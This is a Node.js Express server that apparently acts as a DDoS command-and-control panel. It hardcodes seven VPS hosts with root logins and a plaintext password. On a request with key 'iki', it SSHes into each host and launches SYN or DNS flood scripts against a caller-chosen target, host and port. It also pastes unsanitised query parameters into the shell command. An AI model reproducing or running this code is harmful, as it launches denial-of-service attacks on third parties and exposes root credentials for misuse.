const express = require('express');
const { Client } = require('ssh2');
const path = require('path');
const app = express();
const port = 2222;

const scripts = {
    syn: 'syn.py',
    dns: 'dns.py'
};

// Daftar VPS
const vpsList = [
    {
        host: '128.199.171.40',
        username: 'root',
        password: 'Xzzy4u@123Xz'
    },
    {
        host: '159.89.207.144',
        username: 'root',
        password: 'Xzzy4u@123Xz'
    },
    {
        host: '165.22.241.138',
        username: 'root',
        password: 'Xzzy4u@123Xz'
    },
    {
        host: '104.131.106.7',
        username: 'root',
        password: 'Xzzy4u@123Xz'
    },
    {
        host: '167.172.255.233',
        username: 'root',
        password: 'Xzzy4u@123Xz'
    },
    {
        host: '161.35.185.218',
        username: 'root',
        password: 'Xzzy4u@123Xz'
    },
    {
        host: '138.197.30.49',
        username: 'root',
        password: 'Xzzy4u@123Xz'
    }
];

app.get('/api', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const portNumber = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (key !== 'iki') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (scripts[method]) {
        const scriptFile = scripts[method];
        const scriptCommand = `timeout ${time}s python3 Cnc2/${scriptFile} ${host} ${portNumber} 1000 1000 900; pkill -f screen`;

        const runScriptOnVps = (vps, callback) => {
            const conn = new Client();
            conn.on('ready', () => {
                console.log(`Connected to VPS: ${vps.host}`);
                conn.exec(scriptCommand, (err, stream) => {
                    if (err) return callback(err);
                    stream.on('close', (code, signal) => {
                        console.log(`Script finished on VPS: ${vps.host}`);
                        conn.end();
                        callback(null, `VPS: ${vps.host} completed with code ${code}`);
                    }).on('data', (data) => {
                        console.log(`OUTPUT VPS ${vps.host}: ${data}`);
                    }).stderr.on('data', (data) => {
                        console.error(`ERROR VPS ${vps.host}: ${data}`);
                    });
                });
            }).connect({
                host: vps.host,
                username: vps.username,
                password: vps.password,
            });
        };

        let results = [];
        let errors = [];
        let completed = 0;

        vpsList.forEach((vps) => {
            runScriptOnVps(vps, (err, result) => {
                completed++;
                if (err) {
                    errors.push(`VPS: ${vps.host} error: ${err.message}`);
                } else {
                    results.push(result);
                }

                if (completed === vpsList.length) {
                    res.json({
                        key: key,
                        host: host,
                        port: portNumber,
                        time: time,
                        method: method,
                        result: results,
                        errors: errors.length > 0 ? errors : null
                    });
                }
            });
        });

    } else {
        res.status(400).json({
            key: key,
            host: host,
            port: portNumber,
            time: time,
            method: method,
            result: 'Unknown method'
        });
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
